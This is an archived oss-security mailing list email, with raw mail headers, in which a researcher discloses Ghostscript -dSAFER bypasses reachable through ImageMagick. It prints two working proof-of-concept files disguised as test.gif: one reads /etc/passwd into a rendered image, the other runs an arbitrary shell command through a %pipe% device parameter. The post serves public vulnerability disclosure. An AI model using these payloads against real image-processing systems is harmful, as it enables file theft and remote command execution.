X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1497" "Friday" "30" "September" "2016" "13:05:16" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFkJxK8re4yc1xVN79Y9k7tDoO-fFO-xJNzgvVG9ZgPQtzw@mail.gmail.com>" "50" "Re: [oss-security] ImageMagick identify \"d:\" hangs" "^Cc:" nil nil "9" "2016093020:05:16" "[oss-security] ImageMagick identify \"d:\" hangs" (number mark "        taviso@googl Sep 30   50/1497  " thread-indent "\"Re: [oss-security] ImageMagick identify \"d:\" hangs\"\n") "<CAJ_zFkLoaj_k74mMCFwWs+n7Mv9gwOdFa3AcyQf=W_ViHS2nag@mail.gmail.com>" ("<alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>" "<20160927142500.3x26pcrhw5x4nt6s@jwilk.net>" "<alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>" "<CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>" "<CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>" "<877f9vcjd9.fsf@mid.deneb.enyo.de>" "<CAJ_zFk+T7TD7Ke=k7kbRbxGfnyARQXX1YxGehshKj11RxQD6BA@mail.gmail.com>" "<CAJ_zFkLoaj_k74mMCFwWs+n7Mv9gwOdFa3AcyQf=W_ViHS2nag@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 19794 invoked by uid 550); 30 Sep 2016 20:15:30 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 16000 invoked from network); 30 Sep 2016 20:05:49 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20120113;
        h=mime-version:in-reply-to:references:from:date:message-id:subject:to
         :cc;
        bh=rE6UfN5lW0WBkKp5CNMgwvrk57aYHnYDX2Vt1lVnbiY=;
        b=Ngk1vLOeyLq3RrfCeKLiSidTQwwLONMbmLWLtgPkMg4TpOS2aM39kJ5xnzm8lZVj9z
         ZO7tbFQ24VaErt4LC2oDlu7IjhohuFl2a6m7p/NLpDiDok8nKkGtWvPrvEuAM5PNODyP
         9oxEmK4DPERtKdKgoMzz9kmHB44taWh/lyqXhHEDISKu3QIfP29c1BnVFC3IAEBSLlZQ
         WpYVGZdbXkpjp7e6rGl/mr5BB3QpnNr5a0NlGXHhRcMoQddpRgBIbfU9swFv9fB20W8W
         vvAkMfDANXDP8vi0ne+knHNCGEk8MVfRI9eA4/mA7KupivlQ3XXDqcGlT0PhT5Yp+u6r
         DaCQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
         :message-id:subject:to:cc;
        bh=rE6UfN5lW0WBkKp5CNMgwvrk57aYHnYDX2Vt1lVnbiY=;
        b=i1c8bvQsgOfHb/0qWny6yl0LgirvX7NtAPd6RfLJP8gA+kCBT6ULBaBI77XTgCOHhD
         Co2XmTg01J/3TJrTZy3XveHuTFMcOSS9d7A/UTL1ahqrZH0L5QVwfWGV2zrLyZVN3l8r
         XhjRLiwWFk36C09QdYs309XJMm933L0uZJPeIFYZ6Z5SCjUoOF8IbcGcQB9kiU2IwWzq
         9NAVtR4PbhaAfeSNf2I4qiRfyHVK5Vj+Ve7o4CbJ6Ny4QVwsooxbPUt3j2zkRyv8ONNx
         mbBgQTzZZRmWPatN4eog7TPvs/1gIvFqokRSLAHGb37/D5a3VcQKsjW/vcGgjHN+20BE
         eIWQ==
X-Gm-Message-State: AA6/9RkIVfoZKDTkCqas1F2Qfdr7J0yBuLIyN3kVTlrI+Vbz8HQ0PTjWLVuaMH1XdbYprlYqgya5rXtHpthTf/ou
X-Received: by 10.176.6.233 with SMTP id g96mr6658291uag.135.1475265937438;
 Fri, 30 Sep 2016 13:05:37 -0700 (PDT)
MIME-Version: 1.0
In-Reply-To: <CAJ_zFkLoaj_k74mMCFwWs+n7Mv9gwOdFa3AcyQf=W_ViHS2nag@mail.gmail.com>
References: <alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>
 <20160927142500.3x26pcrhw5x4nt6s@jwilk.net> <alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>
 <CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>
 <CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>
 <877f9vcjd9.fsf@mid.deneb.enyo.de> <CAJ_zFk+T7TD7Ke=k7kbRbxGfnyARQXX1YxGehshKj11RxQD6BA@mail.gmail.com>
 <CAJ_zFkLoaj_k74mMCFwWs+n7Mv9gwOdFa3AcyQf=W_ViHS2nag@mail.gmail.com>
Message-ID: <CAJ_zFkJxK8re4yc1xVN79Y9k7tDoO-fFO-xJNzgvVG9ZgPQtzw@mail.gmail.com>
Content-Type: text/plain; charset=UTF-8
Cc: Florian Weimer <fw@deneb.enyo.de>
Date: Fri, 30 Sep 2016 13:05:16 -0700
From: Tavis Ormandy <taviso@google.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] ImageMagick identify "d:" hangs
To: oss-security@lists.openwall.com

On Thu, Sep 29, 2016 at 2:28 PM, Tavis Ormandy <taviso@google.com> wrote:
>
> Just for future reference, here is an example of dumping a file to an
> image processed with ImageMagick that works with gs 9.20:
>
> $ cat test.gif
> %!PS
> /Size 20 def                             % font/line size
> /Line 0 def                              % current line
> /Buf 1024 string def                     % line buffer
> /Path 0 newpath def
>
> /Courier-Bold findfont Size scalefont setfont
> 1 1 1 setrgbcolor clippath fill          % draw white background
> 0 0 0 setrgbcolor                        % set black foreground
>
> (/etc/passwd) .libfile {
>     {
>         dup Buf readline
>         {
>             Path Line moveto show
>         }{
>             showpage
>             quit
>         } ifelse
>         % next line
>         /Line Line Size add def
>     } loop
> } if
> $ convert test.gif png:test.png

The more I look, the worse it gets. This also works in 9.18 and
higher, arbitrary shell command execution:

$ cat test.gif
currentdevice null true mark /OutputICCProfile (%pipe%id > /dev/tty)
.putdeviceparams
quit
$ convert test.gif png:test.png

(Note: I don't know why it doesn't work on earlier versions, maybe
it's possible to make it work, or some other param will work)

I think -dSAFER is too dangerous to use without sandboxing right now,
things like evince and imagemagick that use it as a backend should
disable by default.

I'm not planning to look any more at this.

Tavis.
